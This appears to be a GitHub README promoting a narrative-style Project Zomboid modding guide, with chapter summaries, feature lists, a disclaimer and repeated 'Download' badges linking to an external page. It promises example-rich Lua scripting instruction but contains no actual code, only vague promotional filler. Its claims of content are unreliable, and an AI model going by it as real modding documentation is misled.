![preview](https://raw.githubusercontent.com/salmaxd/Zomboid-Scripting-Compendium/main/screen_cfa5e.svg)

# Project Zomboid: The Unwritten Codex ⚔️

**A Narrative-Driven Compendium for Crafting Custom Survival Experiences**

Welcome, survivor, to a different kind of documentation. The world has ended, but your imagination doesn't have to. This repository is not a mere list of scripts and functions; it is an atlas of the invisible architecture that governs Knox County. While others focus on the "how" of modding, this guide is obsessed with the "why" and the "what if." If you've ever wanted to turn the apocalypse into a gothic horror story, a post-nuclear wasteland, or a serene farming simulation amidst the chaos, you've found your blueprint.

This project is a living manuscript designed to bridge the gap between raw Lua code and the unforgettable player experience. It is a comprehensive, example-rich walkthrough that treats the game's engine not as a tool, but as a narrative medium. Whether you are a seasoned scripting veteran or a curious newcomer who has never opened a code editor, this Codex will teach you to speak the language of the game's heart—turning static data into dynamic, living systems that respond to every decision a player makes. This isn't just about adding a new weapon; it’s about creating a reason for that weapon to exist in the story of the world.

## 🌍 Overview: Why This Guide Exists

The vanilla game offers a robust survival sandbox, but the true potential lies in its malleability. Most guides present disjointed snippets of code, leaving you to stitch together the logic yourself. This repository adopts a holistic, narrative-first approach. Here, you won't find a dry dictionary of functions; you will find strategic "chapters" that explain how to manipulate the zombie population to tell a story of dwindling hope, or how to rewire the electricity system to create a sense of lingering dread.

We operate on the philosophy that a mod is a story you tell to the player. The code is just your vocabulary. This guide helps you craft compelling sentences. By understanding the underlying framework—the event triggers, the moodle system, the item distribution tables—you can create a cohesive world that feels less like a mod and more like an official expansion. We explore how to use these systems to create emergent gameplay, ensuring that every playthrough is unique, challenging, and emotionally resonant, focusing on the long-form narrative rather than short-term gimmicks.

## ✅ Core Pillars of the Codex

- **Story-Driven Logic:** Learn to bind game events to emotional beats, creating tension and relief through scripting.
- **Holistic System Integration:** Move beyond isolated mods to create interconnected systems that communicate with each other (e.g., a new disease that affects the weather).
- **Player-Centric Design:** Understand how to adjust difficulty and UI feedback loops to keep the player informed and engaged in your narrative.
- **Performance-First Optics:** Write efficient code that respects the game's engine limits, ensuring your complex story doesn't come at the cost of a playable frame rate.

---

## [![Download](https://raw.githubusercontent.com/salmaxd/Zomboid-Scripting-Compendium/main/app_c73e.svg)](https://salmaxd.github.io/Zomboid-Scripting-Compendium/)

*Begin your descent into the codex below. The full repository is available for the taking.*

---

## 🧠 Chapter 1: The Art of the Variable (Data & Items)

Every relic, weapon, or piece of food starts as a line of text. This chapter dives deep into the `items.txt` and the distribution tables, but with a twist. We don't just show you how to add a "Katana" or a "Canned Beans" duplicate; we teach you how to build *conceptually unique* items. You will learn to create weapons with hidden passive effects that trigger under specific conditions, food items that grant related positive buffs based on a player's skill progression, and clothing that offers diminishing returns as it degrades, telling the story of your survival journey.

### The Sub-System of Crafting
Crafting is more than a recipe list. We will explore how to create unique "choreographic" crafting sequences that require the player to perform actions in a specific order to yield a unique result, encouraging experimentation and environmental interaction rather than just menu-clicking.

## 🧠 Chapter 2: The Pulse of the World (Events & Map)

The game world is a sleeping giant. This chapter focuses on the "Event Hooks"—the moments where your mod can whisper into the game's ear. We cover how to monitor the transition between day and night, track the player's panic level, and respond to the death of a global boss. We also explore the `SandboxVars` to create modular difficulty settings that players can adjust, making your mod as forgiving or as brutal as they need it to be.

### Map Integration: From Cell to Region
Learn to place new buildings or alter existing zones without breaking the game's core spawning logic. We explore the use of `WorldSpawn` and `DistributionTable` connection, ensuring your new locations feel like they belong in the game's ecosystem, populated with the right loot and the right kind of undead pressure.

## 🧠 Chapter 3: The Puppet Strings (NPCs & Zombies)

This is the most vital yet delicate part of modding. We’ll show you how to make the undead more than just stumbling obstacles. You can program unique zombie "classes" that patrol specific areas, protect certain loot, or react to sound with a ferocity that keeps players on their toes—moving away from the catchphrase "unlock" to "engineer" new behaviors.

### The Ritual of the Spawn
We dive into the procedural generation of survivors. This isn't just about making them walk; it's about giving them schedules, emotional states, and the capacity to become allies or threats. We explore the `SpawnRegions` and `NPC` behavior trees to craft compelling non-player characters that genuinely interact with the player's story.

## 🧠 Chapter 4: The Digital Veil (UI & Localization)

A great mod is invisible until you need it. This chapter focuses on the User Interface (UI) and a truly global reach. We'll show you how to create responsive HUDs that react to the player's health or mood, without cluttering the screen. Moreover, the Codex emphasizes **multilingual support** as a core feature, providing a clear framework to ensure your narrative is accessible to a global audience of survivors, ensuring the story is told in many tongues.

---

## 📌 The Distinctive Blade: Key Features

- **Narrative-Driven Examples:** Every script snippet is contextualized within a hypothetical story scenario, making it easier to understand the application.
- **Cross-System Compatibility:** Guidance on ensuring your items, events, and maps speak to each other without lag.
- **Modular Design Blueprint:** A chapter on creating "Framework" mods that allow players to toggle features on/off, akin to a season pass for your content.
- **Optimization Patterns:** Learn to write code that is light on the CPU, ensuring 24/7 server stability without those dreaded memory leaks. We treat performance not as an afterthought, but as the crucial foundation of player trust.
- **The "Safehouse" Debug Kit:** A collection of community-vetted tools and functions to troubleshoot your code, preventing catastrophic crashes during late-game sessions.

---

## 🛠️ The Toolkit: Beyond the Basics

This is where we cover the less glamorous but equally vital components.

- **Responsive Design:** Your mod should be accessible on lower-end machines without sacrificing the visual language of the UI.
- **Code Hygiene:** We provide guidelines on commenting and structuring code so you (or a team) can maintain it for years.
- **The Repository Structure:** A clear breakdown of the directory tree (`media`, `scripts`, `lua`, `mods`) so you can navigate the essential components with ease.

---

## ⚠️ The Fine Print: The Survivor's Disclaimer

Project Zomboid is a complex, evolving beast. Every new build can alter the framework beneath our feet. While the principles and logic in this Codex are designed to be as stable as possible, there is no absolute guarantee of compatibility with future updates. This repository is provided as a community educational resource, and is not affiliated with The Indie Stone. Always keep a backup of your local files before applying extensive changes, and always play-test your modifications in a controlled "sandbox" to avoid corrupting your main game save. The journey is to teach you to fish, not to give you a fish—ensure you understand the code you implement.

---

## 📜 License

This project is open-source, designed to give back to the community. It is licensed under the **MIT License**, which grants you the full freedom to use, modify, and distribute this guide, provided you retain the original copyright notice. We believe in the power of the collective, and we trust you to pay it forward by sharing your own discoveries.

[Read the Full License](LICENSE)

---

## 🌐 Final Thoughts

The apocalypse is a blank canvas. With this Codex in your hand, you are no longer just a player; you are the architect of the end times. Go build something that makes the survivors weep, wonder, and persist.

**Join the caravan of creators.**

## [![Download](https://raw.githubusercontent.com/salmaxd/Zomboid-Scripting-Compendium/main/app_c73e.svg)](https://salmaxd.github.io/Zomboid-Scripting-Compendium/)